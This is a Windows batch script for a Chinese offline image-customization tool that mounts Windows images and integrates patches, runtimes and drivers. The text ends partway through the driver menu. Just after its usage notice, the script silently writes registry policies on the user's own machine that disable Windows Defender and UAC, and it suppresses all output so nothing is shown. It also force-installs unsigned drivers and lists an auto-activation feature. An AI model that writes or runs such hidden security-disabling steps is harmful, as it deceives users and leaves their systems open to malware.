@echo off&color 0A&mode con cols=80 lines=32&setlocal EnableDelayedExpansion&set "+=LAzaHebKiyIOJWfPQcgrXBFjsGVumRvNnZCSdxotYEMDpqkUhlwT"& set "-=%~dp0"
call :ImDisk


set "+=JKMDXYEBFPQGNHLAUVWZCIORSTrstdxcpqjkmyzauvMDAZqwioYu"
set "length="
for /f "skip=1 delims=:" %%w in ('^(echo."!-!"^&echo.^)^|findstr /o ".*"') do set /a "length=%%w-7"
if /i "!-:~-2,1!" neq "!-:~%length%,1!" cls&&echo.&&echo.本工具路径包含中文，这可能会导致某些功能不正常，请按任意键退出后重命名路径...&&pause>nul&&goto :End
"!Windir!\System32\FLTMC.exe" >nul 2>nul || cls && echo. && echo.请以管理员身份运行本工具，请按任意键退出.....&&pause>nul&&goto :End
cls&echo.
echo.    _______________________________ 使用须知 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows-离线整合工具，无需虚拟机，无需安装系统，无需相关知识，简单   ^|
echo.   ^|                                                                        ^|
echo.   ^|   几步就可以得到一个强大的系统镜像。支持 Windows 7 8 10 其工作原理就   ^|
echo.   ^|                                                                        ^|
echo.   ^|   是把映像解压开，然后做一些修改后重新保存成新的映像。好处是不需要将   ^|
echo.   ^|                                                                        ^|
echo.   ^|   系统安装到或虚拟机磁盘，不会产生垃圾，也不会整合失败。               ^|
echo.   ^|                                                                        ^|
echo.   ^|   以下是使用须知，有必要先看一下。                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   1、此工具内的所有文件或文件夹都不要重命名。                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   2、此工具所在路径最好不要包含空格，不要有中文文件夹。                ^|
echo.   ^|                                                                        ^|
echo.   ^|   3、最好将此工具放在SSD硬盘，挂载和保存系统速度会更快。               ^|
echo.   ^|                                                                        ^|
echo.   ^|   4、若不能正常工作，请尝试退出电脑管家360之类的软件。                 ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo. & echo.^>^>^>^>^>^>^>请按任意键继续...
pause>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f >nul 2>nul

:begin
pushd "!-!"
set "Sysprep="
set "SysprepPath="
set "Scripts="
set "ScriptsPath="
set "AppleSSD="
set "ScriptsLog="
set "Version="
set "Bit="
set "ToolsPath="
set "Dism="
set "HOST_Language="
set "ProductName="
set "IeVersion="
set "Cmd="
set "MountBit="
SET "ImageBuild="
SET "ImageFlag="
SET "ReleaseId="
SET "Component="
set "Sysprep=Mount\Windows\Sysprep"
set "SysprepPath=%%windir%%\Sysprep"
set "Scripts=Mount\Windows\Setup\Scripts"
set "ScriptsPath=%%windir%%\Setup\Scripts"
set "ScriptsLog=Mount\Windows\Logs\ScriptsLog"
if /i !PROCESSOR_ARCHITECTURE! equ AMD64 (set "ToolsPath=File\Bin\x64"&set "Dism=File\Bin\x64\DISM\dism.exe") else (set"ToolsPath=File\Bin\x86"&set "Dism=File\Bin\x86\DISM\dism.exe")
if not exist "Mount\Windows\System32\config\software" goto :menu1
"!Dism!" /English /Get-MountedImageInfo:"Mount"|find /i "Status : Ok" >nul 2>nul&&goto :menu2||"!Dism!" /Remount-Image /MountDir:"Mount" >nul 2>nul&&goto :menu2

:menu1
cls&mode con cols=80 lines=30&title CMD-Windows整合工具-2.9.2
echo.
echo.    _______________________________ 整合工具 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 挂载映像                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 捕捉映像                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 卸载映像                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] 格式转换                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] 映像编辑                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] 下载母盘                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [7] Windows 系统优化                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [8] 相关教程                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 退出                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12345678X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 9 goto :End
if errorlevel 8 goto :jiaocheng
if errorlevel 7 goto :xitongyouhua
if errorlevel 6 goto :mupan
if errorlevel 5 goto :ImageEdit
if errorlevel 4 goto :Convert
if errorlevel 3 goto :UninstallImage
if errorlevel 2 goto :SaveImage
if errorlevel 1 goto :MountImage

:menu2
cls&mode con cols=80 lines=30&title CMD-Windows整合工具-2.9.2
reg query HKLM\ZTM >nul 2>nul||reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
echo.
echo.    _______________________________ 整合工具 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 挂载映像   [G] 转到整合菜单                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 捕捉映像   [L] 转到精简菜单                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 卸载映像   注意：整合和精简不能同时操作                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] 格式转换                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] 映像编辑                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] 下载母盘                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [7] 相关教程                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 退出                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1234567GLX /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 10 goto :End
if errorlevel 9 goto :RemoveMenu
if errorlevel 8 goto :menu3
if errorlevel 7 goto :jiaocheng
if errorlevel 6 goto :mupan
if errorlevel 5 goto :ImageEdit
if errorlevel 4 goto :Convert
if errorlevel 3 goto :UninstallImage
if errorlevel 2 goto :SaveImage
if errorlevel 1 goto :MountImage

:menu3
cls&mode con cols=80 lines=44&title 离线整合菜单
reg query HKLM\ZTM >nul 2>nul||reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
if exist "Mount\Windows\SysWOW64" (set "Bit=64") else (set "Bit=86")
for /f "tokens=4 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName"') do (set "Version=%%i")
if /i "!Version!"=="10" for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"') do (set "ReleaseId=%%i")
set "AppPath="
set "Item="
set "goto="
echo.       
echo.    _______________________________ 整合菜单 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [A] 安装补丁                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [B] 升级浏览器至IE-11或Chromium内核Edge                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [C] 整合运行库                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [D] 整合驱动                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [E] 整合自动激活                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [F] 自动运行其他应用程序 (支持静默参数)                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [G] 优化系统                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [H] 集成CMD-PE (你将得到一个安装不坏的系统镜像)                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [I] 开启Compact OS (紧凑型操作系统)                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [J] OEM信息设置                                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [K] IE浏览器主页设置                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [L] Windows更新设置                                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [M] 关闭Windows任何服务                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [N] 整合自动清理                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [O] 针对苹果电脑优化 (自动搜索并安装BootCamp驱动，傻瓜式创建多分区)  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [P] 整合无人值守自动安装                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|       操作记录保存在^<操作日志.log^>                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:ABCDEFGHIJKLMNOPX /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 17 goto :begin
if errorlevel 16 goto :input16
if errorlevel 15 goto :input15
if errorlevel 14 goto :input14
if errorlevel 13 goto :input13
if errorlevel 12 goto :input12
if errorlevel 11 goto :input11
if errorlevel 10 goto :input10
if errorlevel 9 goto :input9
if errorlevel 8 goto :input8
if errorlevel 7 goto :input7
if errorlevel 6 goto :input6
if errorlevel 5 goto :input5
if errorlevel 4 goto :input4
if errorlevel 3 goto :input3
if errorlevel 2 goto :input2
if errorlevel 1 goto :input1

:input1
cls&mode con cols=80 lines=30
title 安装Windows!Version!_x!Bit!补丁
set "Item=安装Windows!Version!_x!Bit!补丁"
set "goto=menu3"
echo.         
echo.    _______________________________ 安装补丁 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   支持.CAB和.MSU格式的补丁安装。                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 安装补丁                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 下载Windows7补丁                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :menu3
if errorlevel 2 goto :DownloadUpdate
if errorlevel 1 goto :UpdateNext

:UpdateNext
cls&echo. 
echo.    _______________________________ 安装补丁 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
if /i "!Version!"=="7" echo.   ^|   请选择包含Windows!Version!_x!Bit!补丁的文件夹                                   ^|
if /i "!Version!"=="10" echo.   ^|   请选择包含Windows!Version!_x!Bit!补丁的文件夹                                  ^|
if /i "!Version!"=="8" echo.   ^|   请选择包含Windows!Version!_x!Bit!补丁的文件夹                                   ^|
if /i "!Version!"=="8.1" echo.   ^|   请选择包含Windows!Version!_x!Bit!补丁的文件夹                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
set "Source="
set /p Source=^>^>^>^>^>^>^>请输入:
if not defined Source cls&&echo.&&echo.您的输入为空，请按任意键返回重新输入...... && pause>nul&&goto :UpdateNext
set "Source=!Source:"=!"
if /i "!Source!" equ "x" goto :input1
if not exist "!Source!" cls&&echo.&&echo.您的输入"!Source!"不是完整路径，请按任意键返回重新输入...... && pause>nul&&goto :UpdateNext
echo "!Source!"|findstr " / * ? < > | "&&cls&&echo.&&echo.您的输入格式不正确，请按任意键返回重新输入...... && pause>nul&&goto :UpdateNext
if /i "!Source:.=!" equ "" cls&&echo.&&echo.您的输入格式不正确，请按任意键返回重新输入...... && pause>nul&&goto :UpdateNext
dir /a-d /b /s "!source!"|findstr /i ".cab .msu">nul 2>nul || cls && echo. && echo.您输入的路径"!source!\"内，未发现可用补丁。 && echo. && echo.请按任意键返回重新输入... && pause>nul && goto :updatenext
cls && echo. && echo.正在为windows!version!_x!bit!安装补丁，请稍等...
taskkill /f /im dism++x64.exe >nul 2>nul
taskkill /f /im regedit.exe >nul 2>nul
reg unload hklm\ztm >nul 2>nul
"!dism!" /image:"mount" /add-package /packagepath:"!source!"
reg load hklm\ztm "mount\windows\system32\config\software" >nul 2>nul
call :log & call :achiexe

:DownloadUpdate
if !Version! neq 7 (cls && echo. && echo.已挂载映像是Windows!Version!_x!Bit!，目前只提供Windows7的补丁下载。 && echo. && echo.请按任意键返回... && pause>nul && goto :input1)
if /i "!Bit!"=="64" ( 
	start https://pan.baidu.com/s/1-KmJ1eRsv1wtSUIbxUdfEw & goto :input1
) else (
	start https://pan.baidu.com/s/1-KmJ1eRsv1wtSUIbxUdfEw & goto :input1
)

:input2
cls&mode con cols=80 lines=30&title OEM信息设置
set "Item="
set "goto=input10"
echo.
echo.    ______________________________ 升级浏览器 ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 升级IE浏览器至IE 11                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 升级Edge浏览器至新版Chromium内核Edge                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :menu3
if errorlevel 2 goto :Edge
if errorlevel 1 goto :IE11

:IE11
cls&mode con cols=80 lines=30&title 升级IE浏览器至IE-11&set "Item=升级IE浏览器至IE-11"
set "goto=menu3"
if /i not "!Version!"=="7" (cls&&echo.&&echo.已挂载映像是 Windows !Version! x!Bit!，没有必要再安装IE11。&&echo.&&echo.请按任意键返回...&&pause>nul&&goto :menu3)
for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Internet Explorer" /v "Version"') do set "IeVersion=%%i"
if /i "!IeVersion:~2,2!"=="11" cls&&echo.&&echo.该映像内的IE浏览器版本已为IE11，请按任意键返回...&&pause>nul&&goto :menu3
cls&&echo.&&echo.正在安装 IE11 浏览器，请稍等...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
"!Dism!" /Image:"Mount" /Add-Package /packagepath:"File\IE11\x!Bit!\Windows6.1-kb2670838-x!Bit!.cab" /packagepath:"File\IE11\x!Bit!\IE-Win7.CAB" /packagepath:"File\IE11\x!Bit!\ielangpack-zh-CN.CAB" /packagepath:"File\IE11\x!Bit!\IE-Hyphenation-en.MSU" /packagepath:"File\IE11\x!Bit!\IE-Spelling-en.MSU" /NoRestart
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
reg query "HKLM\ZTM\Microsoft\Internet Explorer" /v "svcVersion" >nul 2>nul&&call :Log&&call :Achiexe||call :Failure

:Edge
cls&mode con cols=80 lines=30&title 升级Edge浏览器至新版Chromium内核Edge&set "Item=升级Edge浏览器至新版Chromium内核Edge"
set "goto=menu3"
set "AppPath=File\Edge\MicrosoftEdgeEnterpriseX!Bit!.msi"

if exist "!AppPath!" (
	copy /v /y "File\Edge\MicrosoftEdgeEnterpriseX!Bit!.msi" "!Scripts!" >nul 2>nul
	echo %%~dp0MicrosoftEdgeEnterpriseX!Bit!.msi /quiet /norestart > "!ScriptsLog!\Edge.log"
) else (
	call :AppPath
)
if exist "!Scripts!\MicrosoftEdgeEnterpriseX!Bit!.msi" (
	if exist "!ScriptsLog!\Edge.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:input3
cls&mode con cols=80 lines=30&title 整合运行库
set "Apppath="
set "Item="
set "Goto="
for /f "tokens=4 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName"') do (set "Version=%%i")
echo.         
echo.    ______________________________ 整合运行库 ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 整合.NET_Framework_4.8.4                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 整合.NET_Framework_4.8.4_中文语言包                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 整合.NET_Framework_3.5                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] 整合VC++运行库最新版                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] 整合DirectX9运行库最终版                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12345X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 6 goto :menu3
if errorlevel 5 goto :InstallDX9
if errorlevel 4 goto :InstallVC
if errorlevel 3 goto :InstallNet35
if errorlevel 2 goto :InstallNetLanguage
if errorlevel 1 goto :InstallNet48

:InstallNet48
cls&title 整合.Net Framework_4.8.4_x!bit!
set "item=整合.Net Framework_4.8.4_x!bit!"
set "goto=input3"
if /i "!version!"=="7" (
	cls && echo.&&echo.正在整合.Net Framework_4.8.4_x!bit!，请稍等...
	"!toolspath!\7z.exe" -y x "file\net\dotnetfx48_x!bit!.7z" -o"mount" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallNet" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\microsoft.net\framework\v4.0.30319\ndp\" && del /f /q \"!windir!\microsoft.net\framework\v4.0.30319\ndp\"" /f  >nul 2>nul
) else (
	cls&&echo.&&echo.已挂载的系统是Windows!version!_x!bit!，请忽略此项。请按任意键返回...&&pause>nul&&goto :input3
)
reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce"|find /i "InstallNet" >nul 2>nul&&call :Log&&call :Achiexe || call :Failure

:InstallNetLanguage
cls
title 整合.NET Framework_4.8.4_x!Bit!中文语言包
set "Item=整合.NET Framework_4.8.4_x!Bit!中文语言包"
set "goto=input3"
if /i "!Version!"=="7" (
	cls&&echo.&&echo.正在整合.NET Framework_4.8_x!Bit!中文语言包，请稍等...
	"!ToolsPath!\7z.exe" -y x "File\Net\dotNetFx48LP_x!Bit!_CHS.7z" -o"Mount" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallNetLanguage" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\Microsoft.NET\Framework\v4.0.30319\NDPCHS\" && del /f /q \"!windir!\Microsoft.NET\Framework\v4.0.30319\NDPCHS\"" /f >nul 2>nul
) else ( 
	cls&&echo.&&echo.已挂载的系统是Windows!Version!_x!Bit!，请忽略此项。请按任意键返回...&&pause>nul&&goto :input3
)
reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce"|find /i "InstallNetLanguage" >nul 2>nul&&call :Log&&call :Achiexe || call :Failure

:InstallNet35
cls
title 整合.NET Framework_3.5_x!Bit!
set "Item=整合.NET Framework_3.5_x!Bit!"
set "goto=input3"
set "NetTargetFile="
IF /I "!Version!"=="7" (echo.&&echo.已挂载的系统是Windows!Version!_x!Bit!，请忽略此项。请按任意键返回...&&pause>nul&&goto :input3)
IF /I "!Bit!"=="64" (set "MountBit=amd64") else (set "MountBit=x86")
if not exist "File\Net\Windows!Version!_x!Bit!_Net3.5\!ReleaseId!\microsoft-windows-netfx3-ondemand-package~31bf3856ad364e35~!MountBit!~~.cab" (
	cls && echo.        
	echo.    ________________________ 整合.NET Framework_3.5 ________________________
	echo.   ^|                        ------------------------                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   请选择包含Windows!Version!_x!Bit!的.NET Framework_3.5安装包的文件夹            ^|
	echo.   ^|                                                                        ^|
		echo.
	set "Source="
	for /f "tokens=*" %%a in ('!ToolsPath!\Wfolder.exe "++" "D:" "请选择包含.NET Framework_3.5安装包的文件夹"') do set "source=%%a"
	if defined source set "source=!source:++ =!"&&set "source=!source:"=!"
	if not defined source goto :input3
	if /i "!Version!"=="10" (
		if not exist "!Source!\microsoft-windows-netfx3-ondemand-package~31bf3856ad364e35~!MountBit!~~.cab" (
			cls&&echo.&&echo.该文件夹"!Source!"内并未发现适合Windows!Version!_x!Bit!的.NET Framework_3.5安装包，请重新选择。
			echo.&&echo.请按任意键返回...&&pause>nul&&goto :InstallNet35
		)	
	)
	set "NetTargetFile=!Source!" 
) else (
	if !Version! equ 10 set "NetTargetFile=File\Net\Windows!Version!_x!Bit!_Net3.5\!ReleaseId!"
)
cls&&echo.&&echo.正在整合.NET Framework_3.5_x!Bit!，请稍等...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
set "NetStatus="
"!Dism!" /Image:"Mount" /Enable-Feature /FeatureName:NetFx3 /All /LimitAccess /Source:"!NetTargetFile!"&&set "NetStatus=ok"||(cls&&echo.&&echo.整合.NET Framework_3.5_x!Bit!失败，请检查挂载目录是否为纯英文路径，请按任意键继续...&&pause>nul)
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
if /i "!NetStatus!"=="ok" (call :Log && call :Achiexe) else (call :Failure)

:InstallVC
cls&title 整合VC++运行库_x!Bit!
set "Item=整合VC++运行库_x!Bit!"
set "goto=input3"
if /i "!Version:~0,1!"=="8" set "Version=10"
cls&&echo.&&echo.正在整合VC++运行库_x!Bit!，请稍等...
"!ToolsPath!\7z.exe" -y x "File\VC\MSVBCRT_x!Bit!.7z" -o"Mount" "-xr^!MSVBCRT*" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\VC\MSVBCRT_x!Bit!.7z" "Windows\System32\MSVBCRT!Version!" -o"Mount" >nul 2>nul
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallMSVBCRT" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\System32\MSVBCRT!Version!\" && del /f /q \"!windir!\System32\MSVBCRT!Version!\"" /f >nul 2>nul
reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce"|find /i "InstallMSVBCRT" >nul 2>nul&&call :Log&&call :Achiexe || call :Failure

:InstallDX9
cls&title 整合DirectX9运行库_x!Bit!
set "Item=整合DirectX9运行库_x!Bit!"
set "goto=input3"
cls&&echo.&&echo.正在整合DirectX9运行库_x!Bit!，请稍等...
if /i "!Version!"=="7" (
	"!ToolsPath!\7z.exe" -y x "File\DX9\DirectX9.0c_x!Bit!.7z" -o"Mount" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallDirectX" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\System32\DirectX\" && del /f /q \"!windir!\System32\DirectX\"" /f >nul 2>nul
	reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce"|find /i "InstallDirectX" >nul 2>nul&&call :Log&&call :Achiexe || call :Failure
) else ( 
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	"!Dism!" /Image:"Mount" /Enable-Feature /FeatureName:DirectPlay /All >nul 2>nul
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log
	call :Achiexe
)

:input4
cls&mode con cols=80 lines=30&title 整合驱动
set "AppPath="
set "Item="
set "goto=input4"
echo.        
echo.    _______________________________ 整合驱动 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 整合USB驱动                                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 整合NVME驱动  (使windows7支持M.2固态硬盘)                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 整合E3_RAID驱动                                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] 整合KabyLake_RAID驱动                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] 添加驱动总裁                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] 添加万能驱动                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [7] 整合苹果驱动                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [8] 整合自定义驱动                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12345678X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 9 goto :menu3
if errorlevel 8 goto :UserDrives
if errorlevel 7 goto :AppleDrive
if errorlevel 6 goto :EasyDrv
if errorlevel 5 goto :DrvCeonw
if errorlevel 4 goto :KabyLakeRAID
if errorlevel 3 goto :E3RAID
if errorlevel 2 goto :NVME
if errorlevel 1 goto :USB

:UserDrives
cls&title 整合自定义驱动&set "Item=整合自定义驱动"
echo.        
echo.    ______________________________ 自定义驱动 ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   请包含驱动的文件夹。                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
set "Source="
for /f "tokens=*" %%a in ('!ToolsPath!\Wfolder.exe "++" "D:" "请选择包含驱动的文件夹"') do set "source=%%a"
if defined source set "source=!source:++ =!"&&set "source=!source:"=!"
if not defined source goto :input4
dir /a-d /b /s "!Source!"|findstr /i ".sys .inf .cat" >nul 2>nul||cls&&echo.&&echo.您输入的路径"!Source!\"内，未发现可用驱动。&&echo.&&echo.请按任意键返回重新选择...&&pause>nul&&goto :UserDrives
cls&&echo.&&echo.正在整合驱动中，请稍等...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
"!Dism!" /image:"Mount" /add-driver /driver:"!Source!" /Recurse /ForceUnsigned
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
cls&&echo.&&echo.驱动整合完成，请按任意键返回...&&pause>nul&&goto :input4

:USB
cls&title 整合USB驱动&set "Item=整合USB驱动"
echo.        
echo.    ______________________________ 整合USB驱动 ______________________________
echo.   ^|                              -------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[1]:系统部署时会根据硬件智能安装USB3.*驱动。                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[2]:将USB3.*驱动整合至载映像，使其原生支持USB3.*接口。           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 智能安装USB驱动                                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 整合USB驱动至映像                                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择:
if errorlevel 3 goto :input4
if errorlevel 2 goto :UsbToImage
if errorlevel 1 goto :CeoMSX

:CeoMSX
cls&title 整合USB驱动&set "Item=整合USB驱动"
set "AppPath=File\Driver\DrvCeonw.7z"
if /i "!Version!"=="7" (
	if exist "!AppPath!" (
		"!ToolsPath!\7z.exe" -y x "!AppPath!" "DrvCeox!Bit!.exe" "Res" "Win!Version!x!Bit!\MFSET.INI" "Win!Version!x!Bit!\XHCI.7z" "Win!Version!x!Bit!\XHCI.INI" "Win!Version!x!Bit!\XHCI.ScIndex" "Drvceo.ini" -o"!Scripts!\USB" >nul 2>nul
		echo.>>"!Scripts!\USB\Drvceo.ini"
		echo Silence=on>>"!Scripts!\USB\Drvceo.ini"
		ren "!Scripts!\USB\DrvCeox!Bit!.exe" "USB_x!Bit!.exe"
		echo %%~dp0USB\USB_x!Bit!.exe -d ^&^& call "%%ProgramFiles%%\SysCeo\DrvCeo\uninstall.bat" ^&^& rd /s /q "%%ProgramFiles%%\SysCeo" > "!ScriptsLog!\USB.log"
	) else (
		call :AppPath	
	)
) else (
	echo. && echo.挂载的系统是Windows!Version!_x!Bit!，请忽略此项。请按任意键返回... && pause>nul && goto :input4
)
if exist "!Scripts!\USB\USB_x!Bit!.exe" (
	if exist "!ScriptsLog!\USB.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	call :Failure
)

:UsbToImage
cls&title 整合USB驱动&set "Item=整合USB驱动"
if /i "!Version!"=="7" (
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	"!Dism!" /image:"Mount" /add-driver /driver:"File\USB\x!Bit!" /Recurse /ForceUnsigned
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log & call :Achiexe
) else (
	echo. && echo.挂载的系统是Windows!Version!_x!Bit!，请忽略此项。请按任意键返回... && pause>nul && goto :input4
)

:NVME
cls&title 整合NVME驱动&set "Item=整合NVME驱动"
if "!Version!"=="7" (
	taskkill /f /IM Dism++x64.exe >nul 2>nul
	taskkill /f /IM regedit.exe >nul 2>nul
	reg unload HKLM\ZTM >nul 2>nul
	cls&&echo.&&echo.正在安装NVME驱动中，请稍等...
	"!Dism!" /image:"Mount" /add-package /packagepath:"File\NVME\x!Bit!\Hotfix"
	reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
	call :Log & call :Achiexe
) else (
